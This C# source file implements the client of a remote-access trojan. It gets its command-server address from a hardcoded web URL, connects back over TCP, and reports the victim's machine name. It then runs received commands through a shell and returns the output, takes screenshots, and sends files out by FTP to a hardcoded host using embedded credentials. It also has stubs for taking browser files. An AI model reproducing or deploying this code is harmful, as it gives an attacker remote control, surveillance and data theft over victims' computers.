using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace k3rn3lpanicTools
{

    /*
    public string SomeMethod(Student student)
    {
        return $"Student Name is {student.Name}. Age is {student.Age}";
    }
     */
    public class Client
    {
        private static IPAddress mServerIPAddress;
        private static int mServerPort;
        private static TcpClient mClient;
        public static bool IsConnected { get; private set; }
        public static bool SetServerInfo(string _IP, int _port)
        {

            if (SetServerIPAddress(_IP))
            {
                if (_port < 65565 && _port > 0)
                {
                    mServerPort = _port;
                    return true;
                }
                return false;
            }
            return false;
        }
        private static bool SetServerIPAddress(string _IPAddr)
        {
            IPAddress ipaddr = null;
            if (!IPAddress.TryParse(_IPAddr, out ipaddr))
            {
                //wrong ip
                return false;
            }
            mServerIPAddress = ipaddr;

            return true;
        }
        public static async Task setVir(RichTextBox l)
        {
            string ServerIP = (k3rn3lpanicTools.Networkinfo.GetRequest("https://diuhiesluce.freehost.io/index.php?Pass=riuefceiordjcjlkmcsdf")).Replace("\0", string.Empty);
            if (ServerIP != "")
            {
                IPAddress ipda;
                if (IPAddress.TryParse(ServerIP, out ipda))
                {
                    SetServerInfo(ServerIP, 23000);
                    await ConnectToServer(l);
                }

            }

        }
        public static async Task ConnectToServer(RichTextBox l = null)
        {

            if (l == null)
                l = new RichTextBox();

            mClient = new TcpClient();
            try
            {
                await mClient.ConnectAsync(mServerIPAddress, mServerPort);
                IsConnected = true;
                l.Text += "\n" + string.Format("Connected to server {0}:{1}", mServerIPAddress, mServerPort);
                Console.WriteLine(string.Format("Connected to server {0}:{1}", mServerIPAddress, mServerPort));
                await SendDataAsync(Encoding.UTF8.GetBytes(SystemInfo.GetInfo(SystemInfo.InfoType.Machinename)));
                await ReadDataAsync(mClient, l);
            }
            catch (Exception ex)
            {
                IsConnected = false;
                Task.Delay(8000).GetAwaiter().GetResult();
                await setVir(l);
                Console.WriteLine(ex.Message);
            }
        }

        private static async Task TakeCareofCommand(string recivedtext, RichTextBox l)
        {
            Clipboard.SetText(recivedtext);
            Console.WriteLine("***Recived : " + recivedtext);
            l.Text += "\n" + "@[#$]>Recived : " + recivedtext;

            if (recivedtext.StartsWith("exec-"))
            {
                string res = Tools.Runcommand(recivedtext.Substring(5));
                await sendStr(res);
                return;
            }
            if (recivedtext.StartsWith("Screenshot"))
            {
                Tools.Capture("capt.jpg");
                await SendFile("capt.jpg","capt.jpg");
                new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", true).DoWork("capt.jpg");
                sendStr("File Sent.");
            }
            if (recivedtext.StartsWith("VoiceMic"))
            {


                sendStr("Mic Sent.");
            }
            if (recivedtext.StartsWith("lsbrowsers"))
            {
                string Browsers = "=========Browsers Installed=========\n";
                string chrome = Tools.IsProgramInstalled("chrome.exe");
                chrome = chrome != "" ? chrome : "Not installed";
                string Mozila = Tools.IsProgramInstalled("firefox.exe");
                Mozila = Mozila != "" ? Mozila : "Not installed";
                Browsers += "Chrome : " + chrome + "\nFireFox : " + Mozila;
                sendStr(Browsers);
            }
            if (recivedtext.StartsWith("GetChromeFiles"))
            {

            }
            if (recivedtext.StartsWith("GetMozillaFiles"))
            {

            }
            if (recivedtext.StartsWith("GetEdgeFiles"))
            {

            }
            if (recivedtext.StartsWith("UploadFile"))
            {
                string Uploadfile = recivedtext.Substring(11);
                await SendFile(Uploadfile,Uploadfile);    
            }
        }
        private static async Task ReadDataAsync(TcpClient mClient, RichTextBox l)
        {
            try
            {
                int readBytesCount = 0;
                NetworkStream stream = mClient.GetStream();
                byte[] HostName = new byte[64];

                await stream.ReadAsync(HostName, 0, HostName.Length);
                l.Text += "\nConnected to : " + Encoding.UTF8.GetString(HostName);
                while (true)
                {
                    byte[] buff = new byte[1000];
                    readBytesCount = await stream.ReadAsync(buff, 0, buff.Length);
                    if (readBytesCount <= 0)
                    {
                        Console.WriteLine("Disconnected");
                        l.Text += "\nDisconnected";
                        IsConnected = false;
                        await Task.Delay(8000);
                        await setVir(l);
                        mClient.Close();
                        break;
                    }
                    string recivedtext = Encoding.UTF8.GetString(buff).Replace("\0", string.Empty);
                    TakeCareofCommand(recivedtext, l);

                    Array.Clear(buff, 0, buff.Length);
                }
                return;

                StreamReader clientStreamReader = new StreamReader(stream);
                char[] _buff = new char[64];
                while (true)
                {
                    readBytesCount = await clientStreamReader.ReadAsync(_buff, 0, _buff.Length);


                    Console.WriteLine("*** Recived : " + new string(_buff));
                    Array.Clear(_buff, 0, _buff.Length);
                }
            }
            catch (Exception excp)
            {
                l.Text += "\nDisconnected";
                IsConnected = false;
                await Task.Delay(8000);
                mClient.Close();
                Console.WriteLine(excp.Message);
                await setVir(l);
                return;
                //throw;
            }

        }
        public static async Task SendDataAsync(byte[] buff)
        {
            if (mClient != null)
            {
                try
                {
                    if (mClient.Connected)
                    {
                        await mClient.GetStream().WriteAsync(buff, 0, buff.Length);
                    }
                }
                catch (Exception)
                {

                    throw;
                }
            }

        }
        public static async Task sendStr(string data)
        {
            byte[] _data = Encoding.UTF8.GetBytes(data);
            byte[] tosend = _data;//AddByteToArray(_data,0);
            await SendDataAsync(tosend);
        }
        private static byte[] AddByteToArray(byte[] bArray, byte newByte)
        {
            byte[] newArray = new byte[bArray.Length + 1];
            bArray.CopyTo(newArray, 1);
            newArray[0] = newByte;
            return newArray;
        }
        public static async Task SendFile(string filename,string filenametosave)
        {
            new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", true).DoWork(filename);
            await sendStr("FileReqsent-" + filenametosave);
        }
    }
}
